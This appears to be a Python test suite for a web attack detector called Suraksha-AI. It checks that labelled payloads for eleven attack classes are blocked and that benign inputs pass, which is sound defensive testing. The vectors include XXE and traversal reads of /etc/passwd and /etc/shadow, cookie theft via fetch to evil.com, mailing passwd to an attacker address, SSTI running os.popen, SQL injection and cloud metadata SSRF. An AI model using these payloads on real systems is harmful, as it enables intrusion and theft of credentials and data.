"""
Suraksha-AI Multi-Threat Automated Test Suite
=============================================
Tests all 11 OWASP Top-10 attack classes against Suraksha-AI engine:
  1. Broken Access Control
  2. XML / XXE Injection
  3. OS Command Injection
  4. Cross-Site Scripting (XSS)
  5. Path Traversal
  6. LDAP Injection
  7. HTTP Header Injection
  8. Server-Side Template Injection (SSTI)
  9. Open Redirect
  10. Server-Side Request Forgery (SSRF)
  11. SQL Injection
"""

import sys
import os

# Add backend to sys.path
backend_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Backend')
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

from ai.utils.multi_threat_engine import MultiThreatEngine
from app.services.detection_service import DetectionService

TEST_VECTORS = [
    # 1. Broken Access Control
    ("Broken Access Control", "admin=true&role=admin&user_id=1", True),
    ("Broken Access Control", "/api/v1/admin/users/export?isAdmin=1", True),

    # 2. XML / XXE Injection
    ("XML / XXE Injection", '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', True),
    ("XML / XXE Injection", '<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/resource=index.php">]><msg>&ent;</msg>', True),

    # 3. Command Injection
    ("Command Injection", "; cat /etc/passwd | mail attacker@evil.com", True),
    ("Command Injection", "| whoami && id", True),
    ("Command Injection", "`ping -c 4 127.0.0.1`", True),

    # 4. Cross-Site Scripting (XSS)
    ("Cross-Site Scripting (XSS)", "<script>alert(document.cookie)</script>", True),
    ("Cross-Site Scripting (XSS)", '<img src="x" onerror="alert(1)">', True),
    ("Cross-Site Scripting (XSS)", "javascript:fetch('http://evil.com/'+document.cookie)", True),

    # 5. Path Traversal
    ("Path Traversal", "../../../../etc/passwd", True),
    ("Path Traversal", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", True),
    ("Path Traversal", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow", True),

    # 6. LDAP Injection
    ("LDAP Injection", "*)(&(objectClass=*)", True),
    ("LDAP Injection", "admin*)(|(uid=*))", True),

    # 7. Header Injection
    ("Header Injection", "victim\r\nSet-Cookie: session=hijacked", True),
    ("Header Injection", "test%0d%0aLocation:%20http://evil.com", True),

    # 8. Server-Side Template Injection (SSTI)
    ("Template Injection (SSTI)", "{{7*7}} ${7*7} __class__.__mro__", True),
    ("Template Injection (SSTI)", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", True),

    # 9. Open Redirect
    ("Open Redirect", "redirect=https://evil-phishing-site.com/login", True),
    ("Open Redirect", "return_url=//attacker.com/malware", True),

    # 10. SSRF
    ("SSRF", "http://169.254.169.254/latest/meta-data/", True),
    ("SSRF", "http://metadata.google.internal/computeMetadata/v1/", True),

    # 11. SQL Injection
    ("SQL Injection", "1' OR '1'='1", True),
    ("SQL Injection", "' UNION SELECT null, username, password FROM users --", True),

    # 12. Legitimate Traffic (Should be allowed)
    ("Safe Traffic", "john.doe@example.com", False),
    ("Safe Traffic", "search query: artificial intelligence models", False),
    ("Safe Traffic", "category=books&sort=price_asc&page=2", False),
]

def run_tests():
    print("=" * 70)
    print(" SURAKSHA-AI MULTI-THREAT DETECTION ENGINE TEST SUITE")
    print("=" * 70)
    
    engine = MultiThreatEngine()
    passed = 0
    total = len(TEST_VECTORS)

    for idx, (expected_cat, payload, should_block) in enumerate(TEST_VECTORS, 1):
        res = engine.evaluate(payload)
        is_blocked = res['blocked']
        detected_cat = res['primary_category']
        score = res['rule_score']
        severity = res['severity']

        # Determine pass/fail
        if should_block:
            is_pass = is_blocked
        else:
            is_pass = not is_blocked

        if is_pass:
            status_str = "[PASS]"
            passed += 1
        else:
            status_str = "[FAIL]"

        print(f"[{idx:02d}/{total:02d}] {status_str} Expected: {expected_cat:<26} | Detected: {detected_cat:<26} | Blocked: {str(is_blocked):<5} | Score: {score:>5.1f} | Severity: {severity}")

    print("=" * 70)
    print(f" RESULTS: {passed}/{total} Tests Passed ({passed/total*100:.1f}%)")
    print("=" * 70)

    # Test Unified DetectionService
    print("\nTesting Unified DetectionService.analyze_request():")
    sample_tests = [
        ("<script>alert(1)</script>", "Cross-Site Scripting (XSS)"),
        ("; cat /etc/passwd", "Command Injection"),
        ("' OR 1=1 --", "SQL Injection"),
        ("admin=true&role=admin", "Broken Access Control"),
        ("../../../../etc/passwd", "Path Traversal"),
        ("normal search query", "Safe")
    ]
    for p, exp in sample_tests:
        ds_res = DetectionService.analyze_request(payload=p)
        print(f"Payload: {p:<30} -> Blocked: {str(ds_res['blocked']):<5} | Category: {ds_res['prediction']:<26} | Threat Level: {ds_res['threat_level']}")

if __name__ == '__main__':
    run_tests()
